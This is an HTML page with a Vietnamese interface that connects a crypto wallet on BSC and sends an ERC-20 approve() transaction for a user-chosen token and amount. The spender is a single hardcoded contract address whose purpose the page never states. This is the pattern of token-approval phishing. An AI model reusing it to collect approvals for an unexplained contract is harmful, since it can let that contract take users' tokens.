<!DOCTYPE html>
<html lang="en">
<head>
  <meta charset="UTF-8">
  <title>Multi Wallet Approval</title>
  <script src="https://unpkg.com/ethers@5.7.2/dist/ethers.umd.min.js"></script>
  <style>
    body { font-family: Arial; padding: 30px; text-align: center; background: #f8f8f8; }
    #app { max-width: 500px; margin: auto; background: white; padding: 20px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
    input, button, select {
      width: 90%;
      padding: 10px;
      margin: 10px;
      font-size: 16px;
      border-radius: 5px;
      border: 1px solid #ccc;
    }
    button { background: #4CAF50; color: white; border: none; cursor: pointer; }
    button:disabled { background: #999; cursor: not-allowed; }
  </style>
</head>
<body>
  <div id="app">
    <div id="status">Vui lòng chọn ví để kết nối</div>
    <select id="walletSelect">
      <option value="">-- Chọn ví --</option>
      <option value="metamask">MetaMask</option>
      <option value="binance">Binance Wallet</option>
      <option value="okx">OKX Wallet</option>
    </select>
    <button id="connectBtn">Kết nối ví</button>

    <input type="text" id="tokenAddress" placeholder="Token address cần approve">
    <input type="text" id="amount" placeholder="Số lượng muốn approve">
    <button id="approveBtn" disabled>Approve</button>
  </div>

  <script>
    const scB_address = "0xb300000b72DEAEb607a12d5f54773D1C19c7028d";
    let signer;

    async function connectWallet() {
      const selectedWallet = document.getElementById("walletSelect").value;
      let provider;

      if (selectedWallet === "metamask") {
        provider = window.ethereum;
      } else if (selectedWallet === "binance") {
        provider = window.BinanceChain;
      } else if (selectedWallet === "okx") {
        provider = window.okxwallet;
      }

      if (!provider) {
        document.getElementById("status").innerText = "Ví không được phát hiện!";
        return;
      }

      try {
        await provider.request({ method: 'eth_requestAccounts' });

        // Kiểm tra và chuyển mạng nếu cần
        const chainId = await provider.request({ method: 'eth_chainId' });
        if (chainId !== '0x38') { // BSC
          try {
            await provider.request({
              method: 'wallet_switchEthereumChain',
              params: [{ chainId: '0x38' }]
            });
          } catch (e) {
            document.getElementById("status").innerText = "Chuyển mạng BSC thất bại!";
            return;
          }
        }

        const ethersProvider = new ethers.providers.Web3Provider(provider);
        signer = ethersProvider.getSigner();
        const address = await signer.getAddress();
        document.getElementById("status").innerText = "Kết nối thành công: " + address;
        document.getElementById("approveBtn").disabled = false;

      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Lỗi khi kết nối ví: " + err.message;
      }
    }

    async function approveToken() {
      const tokenAddress = document.getElementById("tokenAddress").value;
      const amount = document.getElementById("amount").value;

      if (!ethers.utils.isAddress(tokenAddress)) {
        document.getElementById("status").innerText = "Địa chỉ token không hợp lệ!";
        return;
      }

      try {
        const contract = new ethers.Contract(tokenAddress, [
          "function approve(address spender, uint256 amount) public returns (bool)",
          "function decimals() public view returns (uint8)"
        ], signer);

        const decimals = await contract.decimals();
        const parsedAmount = ethers.utils.parseUnits(amount, decimals);
        document.getElementById("status").innerText = "Đang gửi giao dịch approve...";

        const tx = await contract.approve(scB_address, parsedAmount);
        await tx.wait();
        document.getElementById("status").innerText = "Approve thành công! Tx: " + tx.hash;

      } catch (err) {
        console.error(err);
        document.getElementById("status").innerText = "Lỗi khi approve: " + err.message;
      }
    }

    document.getElementById("connectBtn").addEventListener("click", connectWallet);
    document.getElementById("approveBtn").addEventListener("click", approveToken);
  </script>
</body>
</html>
